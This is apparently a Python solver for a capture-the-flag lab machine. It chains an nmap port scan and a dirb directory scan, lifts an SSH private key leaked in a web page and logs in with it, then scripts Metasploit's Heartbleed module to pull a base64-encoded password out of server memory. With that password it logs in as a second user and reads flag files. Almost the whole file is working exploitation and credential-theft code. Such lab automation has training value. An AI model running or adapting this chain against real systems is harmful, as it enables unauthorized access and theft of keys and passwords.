import nmap
import base64
import pexpect
import requests
import re
import os
import subprocess
import sys

# Define target VM IP address

if len(sys.argv) != 2:
    print("Usage: python script.py <target_ip>")
    sys.exit(1)
target_ip = sys.argv[1]

ssh_username = "ns"
# Root username for SSH connection
ssh_root = "hacker"
# Variable to store the port where flag1 is found
flag1_port = ""
# Metasploit commands



def find_f4_port(target_ip):
    scanner = nmap.PortScanner()
    scanner.scan(target_ip, arguments='-p-')

    for host in scanner.all_hosts():
        for proto in scanner[host].all_protocols():
            ports = scanner[host][proto].keys()
            for port in ports:
                state = scanner[host][proto][port]['state']
                if state == 'open':
                    # HTTP GET request to the specified IP address and port
                    url = f"http://{host}:{port}/"
                    try:
                        response = requests.get(url, timeout=5)
                        if response.status_code == 400:
                            print(f"Port {port} on {host} returned a 400 response - Vulnerability detected!")
                            return port
                    except requests.exceptions.RequestException as e:
                        pass
    return None

#target_ip = str(target_ip)

# Metasploit resource file
msf_rc_file = "Bits.rc"
# Key file to store private key
key_file = "key1.key"

# Initialize Nmap PortScanner
nm = nmap.PortScanner()
# Scan target IP for open ports
nm.scan(target_ip, '1-65535')

print("\033[95mScanning for open ports on the target VM...\033[00m")
for host in nm.all_hosts():
    print(f'Host : {host} ({nm[host].hostname()})')

print(f"\033[95mScanning for open ports on {target_ip}...\033[00m")
for proto in nm[target_ip].all_protocols():
    ports = list(nm[target_ip][proto].keys())
    for port in sorted(ports):
        if nm[target_ip]['tcp'][port]['state'] == 'open' and port < 65536:
            url = f'http://{target_ip}:{port}/#1'
            response = requests.get(url)
            source_code = response.text
            flag = re.search(r"flag1\s*{\s*(.*?)\s*}", source_code)
            if flag:
                print(f"\033[92mFlag found on port {port}\033[00m")
                print(u'\u2713' + f" First Flag -> \033[96m flag1{{{flag.group(1)}}}\033[00m")
                print("\nLet's go for the next flag...\n")
                flag1_port = port
            else:
                print(f"\033[91mNo Flag on port {port}\033[00m")

print("\033[95mRunning dirb scan on the target VM...\033[00m")
print("\n...\n")

url = f'http://{target_ip}:{flag1_port}'
command = ['dirb', url]

process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

if process.returncode == 0:
    print("\033[92mDirb scan finished.\033[00m")
    output_lines = process.stdout.split('\n')
    discovered_urls = [line.split(' ')[1] for line in output_lines if line.startswith('+ http://')]
    
    for url in discovered_urls:
        print(f"\033[95mDiscovered URL: \033[96m{url}\033[00m")
        response = requests.get(url)
        source_code = response.text
        flag = re.search(r"flag2\s*{\s*(.*?)\s*}", source_code)
        
        if flag:
            print(u'\u2713' + f" Second Flag -> \033[91m flag2{{{flag.group(1)}}}\033[00m")
            print("\n")
            start_marker = '-----BEGIN OPENSSH PRIVATE KEY-----'
            end_marker = '-----END OPENSSH PRIVATE KEY-----'
            start_index = source_code.find(start_marker)
            end_index = source_code.find(end_marker, start_index)
            
            if start_index != -1 and end_index != -1:
                print("\033[92mPrivate key found in the source code of the website, saving to file...\033[00m")
                key_content = source_code[start_index:end_index + len(end_marker)] + "\n"
                
                if os.path.exists(key_file):
                    os.remove(key_file)
                with open(key_file, 'w') as file:
                    file.write(key_content)
                os.chmod(key_file, 0o700)
                print("\033[92mPrivate key saved to file:\033[00m", key_file)

            break
        else:
            print("\033[91m" + u'\u2717' + " Flag not found on this page\033[00m")

else:
    print("\033[91mError occurred during dirb scan:\033[00m")
    print(process.stderr)


print("\033[95mConnecting to the target VM using SSH...\033[00m")

try:
    ssh_command = f'ssh -i {key_file} {ssh_username}@{target_ip}'
    print(ssh_command)
    session = pexpect.spawn(ssh_command, maxread=1)
    session.expect('[$#]')
    print(u'\u2713' + f" Connected to the target VM as user: {ssh_username}")

    session.sendline('cat flag3.txt')
    session.expect('[$#]')
    output = session.before.decode()
    flag3 = re.search(r"flag3\s*{\s*(.*?)\s*}", output)
    if flag3:
        print(u'\u2713' + f" Third Flag -> \033[92m flag3{{{flag3.group(1)}}}\033[00m")
        print("\n")

    session.close()
except pexpect.exceptions.TIMEOUT:
    print("\033[91m SSH session timed out...\033[00m")
except KeyboardInterrupt:
    print("\033[91m" + u'\u2717' + " Keyboard interrupt detected... Exiting\033[00m")
except Exception as e:
    print("\033[91m" + u'\u2717' + f" Error occurred while connecting: {e}\033[00m")


flag_4_port = find_f4_port(target_ip)

RHOST =  target_ip
RPORT = flag_4_port


msf_commands = """use auxiliary/scanner/ssl/openssl_heartbleed
set RHOST {}
set RPORT {}
set verbose true
run
exit
""".format(RHOST, RPORT)


print("\033[95mInitializing Metasploit for Heartbleed vulnerability exploitation...\033[00m")

if os.path.exists(msf_rc_file):
    os.remove(msf_rc_file)
with open(msf_rc_file, 'w') as file:
    file.write(msf_commands)

try:
    command = ['msfconsole', '-q', '-r', msf_rc_file]
    process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    print("\033[92mMetasploit execution completed successfully.\033[00m")
    print("\033[95mAnalyzing output to extract and decode the password...\033[00m")

    print("\033[95mMetasploit Output:\033[00m")
    print(process.stdout)

    match = re.search(r"password=(.*?) ", process.stdout)
    if match:
        encoded_password = match.group(1)
        pass1 = base64.b64decode(encoded_password + "==").decode('utf-8')
        decoded_password = base64.b64decode(pass1).decode('utf-8').replace(' ', '')
        print("\033[92mPassword decoded:\033[00m", decoded_password)

        ssh_command = f'ssh {ssh_root}@{target_ip}'
        session = pexpect.spawn(ssh_command, maxread=1)
        session.expect(f'{ssh_root}@{target_ip}\'s password:')
        session.sendline(decoded_password)
        session.expect('[$#]')
        session.sendline('cat /home/ns/flag4.txt')
        session.expect('[$#]')
        session.close()

        flag4 = re.search(r"flag4\s*{\s*(.*?)\s*}", session.before.decode())
        if flag4:
            print(f"Fourth Flag -> \033[93mflag4{{{flag4.group(1)}}}\033[00m")
        else:
            print("\033[91mFailed to retrieve the fourth flag.\033[00m")
    else:
        print("\033[91mNo password found in the Metasploit output.\033[00m")
except Exception as e:
    print("\033[91mAn error occurred: ", e, "\033[00m")

print("\033[92mFlags have been obtained!, Happy Hacking !!!\033[00m")